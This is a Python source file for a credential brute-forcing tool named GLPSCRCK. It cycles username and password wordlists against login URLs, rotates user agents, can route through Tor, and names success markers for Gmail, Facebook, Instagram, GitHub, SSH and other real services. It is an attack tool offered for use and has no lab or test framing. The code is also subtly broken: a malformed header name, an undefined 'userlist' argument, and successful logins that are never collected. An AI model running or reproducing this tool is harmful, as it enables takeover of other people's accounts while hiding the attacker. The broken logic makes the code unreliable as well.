import argparse
import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
import logging
from colorama import Fore, Style
import subprocess

def setup_logging(level, log_file=None):
    logging.basicConfig(level=level, format='%(asctime)s - %(levelname)s - %(message)s', filename=log_file)

def load_wordlist(file_path):
    try:
        with open(file_path, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    except IOError:
        logging.error(f"{Fore.RED}Unable to read file: {file_path}{Style.RESET_ALL}")
        return []

def get_default_headers(user_agents):
    user_agent = random.choice(user_agents)
    return {
        'User -Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }

def test_credentials(target, username, password, login_url, username_param, password_param, method, timeout, user_agents, platform, use_tor):
    headers = get_default_headers(user_agents)
    data = {username_param: username, password_param: password}

    proxies = None
    if use_tor:
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }

    try:
        if method == 'POST':
            response = requests.post(login_url, data=data, headers=headers, timeout=timeout, allow_redirects=True, proxies=proxies)
        else:
            response = requests.get(login_url, headers=headers, timeout=timeout, allow_redirects=True, proxies=proxies)

        success_indicators = {
            'gmail': ["/mail/u/0/#inbox", "inbox", "mail.google.com"],
            'facebook': ["https://www.facebook.com/", "home.php"],
            'instagram': ["https://www.instagram.com/", "Feed"],
            'twitter': ["https://twitter.com/home", "login"],
            'linkedin': ["https://www.linkedin.com/feed/", "signout"],
            'yahoo': ["https://login.yahoo.com/", "dashboard"],
            'wordpress': ["/wp-admin/", "dashboard"],
            'github': ["https://github.com/", "logout"],
            'pinterest': ["https://www.pinterest.com/", "logout"],
            'snapchat': ["https://www.snapchat.com/", "home"],
            'http': ["Welcome", "Dashboard", "Home", "Login successful"],
            'https': ["Welcome", "Dashboard", "Home", "Login successful"],
            'ftp': ["230 User logged in", "230 Login successful"],
            'ssh': ["Last login:", "Welcome to"],
            'smtp': ["235 2.7.0 Authentication successful"],
        }

        if response.status_code in [200, 301, 302] and any(indicator in response.text or indicator in response.url for indicator in success_indicators.get(platform, [])):
            logging.info(f"{Fore.GREEN}Success: {username}:{password}{Style.RESET_ALL}")
            return {'username': username, 'password': password}
        else:
            logging.debug(f"{Fore.YELLOW}Failed: {username}:{password} (Status Code: {response.status_code}){Style.RESET_ALL}")
            return None

    except requests.exceptions.RequestException as e:
        logging.error(f"{Fore.RED}Request failed: {e}{Style.RESET_ALL}")
        return None

def run_brute_force(usernames, passwords, login_urls, username_param, password_param, method, timeout, platform, delay, use_tor):
    user_agent_list = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
        'Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36'
    ]

    total_attempts = 0
    successful_logins = []

    total_combinations = len(usernames) * len(passwords) * len(login_urls)
    with tqdm(total=total_combinations, desc="Attempting logins", unit="attempt") as pbar:
        with ThreadPoolExecutor(max_workers=10) as executor:
            for username in usernames:
                for password in passwords:
                    for login_url in login_urls:
                        total_attempts += 1
                        executor.submit(test_credentials, target=login_url, username=username, password=password, 
                                        login_url=login_url, username_param=username_param, password_param=password_param, 
                                        method=method, timeout=timeout, user_agents=user_agent_list, platform=platform, use_tor=use_tor)
                        pbar.update(1)
                        time.sleep(delay)

    logging.info(f"{Fore.CYAN}Total attempts: {total_attempts}, Successful logins: {len(successful_logins)}{Style.RESET_ALL}")

def generate_wordlist(words, output_file):
    if words:
        with open(output_file, 'w') as f:
            for word in words:
                f.write(f"{word}\n")
        logging.info(f"{Fore.GREEN}Wordlist generated and saved to {output_file}{Style.RESET_ALL}")
    else:
        logging.error(f"{Fore.RED}No words provided to generate a wordlist.{Style.RESET_ALL}")

def update_code():
    try:
        subprocess.run(["git", "pull", "https://github.com/gl1tch-ux/glpscrck.git"], check=True)
        logging.info(f"{Fore.GREEN}Code updated successfully from GitHub repository.{Style.RESET_ALL}")
    except subprocess.CalledProcessError as e:
        logging.error(f"{Fore.RED}Failed to update code: {e}{Style.RESET_ALL}")

def parse_args():
    parser = argparse.ArgumentParser(description="GLPSCRCK - A Powerful Password Cracker Tool")
    
    subparsers = parser.add_subparsers(dest='mode', help='Choose the mode: attack, generate, or update')

    attack_parser = subparsers.add_parser('attack', help='Brute-force attack mode')
    attack_parser.add_argument('-u', '--username', help='Single username', type=str)
    attack_parser.add_argument('-P', '--passlist', help='Path to wordlist of passwords', type=str)
    attack_parser.add_argument('-p', '--password', help='Single password', type=str)
    attack_parser.add_argument('-L', '--urllist', help='Path to wordlist of URLs', type=str)
    attack_parser.add_argument('-l', '--url', help='Single URL', type=str)
    attack_parser.add_argument('-m', '--method', help='Request method (POST/GET)', type=str, default='POST')
    attack_parser.add_argument('-t', '--timeout', help='Timeout for requests', type=int, default=10)
    attack_parser.add_argument('-F', '--platform', help='Platform name for success indicator', type=str)
    attack_parser.add_argument('-d', '--delay', help='Delay between requests in seconds', type=int, default=1)
    attack_parser.add_argument('--tor', action='store_true', help='Use Tor for requests')

    generate_parser = subparsers.add_parser('generate', help='Generate custom wordlist mode')
    generate_parser.add_argument('-W', '--words', help='Comma-separated words to generate password list', type=str)
    generate_parser.add_argument('-o', '--output', help='Output file to save the wordlist', type=str, default='generated_passwords.txt')

    update_parser = subparsers.add_parser('update', help='Update the code from GitHub repository')

    return parser.parse_args()

def main():
    args = parse_args()

    if args.mode == 'attack':
        usernames = [args.username] if args.username else load_wordlist(args.userlist)
        passwords = [args.password] if args.password else load_wordlist(args.passlist)
        urls = [args.url] if args.url else load_wordlist(args.urllist)
        
        if not (usernames and passwords and urls):
            logging.error(f"{Fore.RED}You must provide usernames, passwords, and URLs.{Style.RESET_ALL}")
            return

        run_brute_force(usernames, passwords, urls, 'username', 'password', args.method, args.timeout, args.platform, args.delay, args.tor)
    
    elif args.mode == 'generate':
        words = args.words.split(',') if args.words else []
        generate_wordlist(words, args.output)

    elif args.mode == 'update':
        update_code()
    
    else:
        print("Please choose a valid mode: 'attack', 'generate', or 'update'.")

if __name__ == '__main__':
    main()
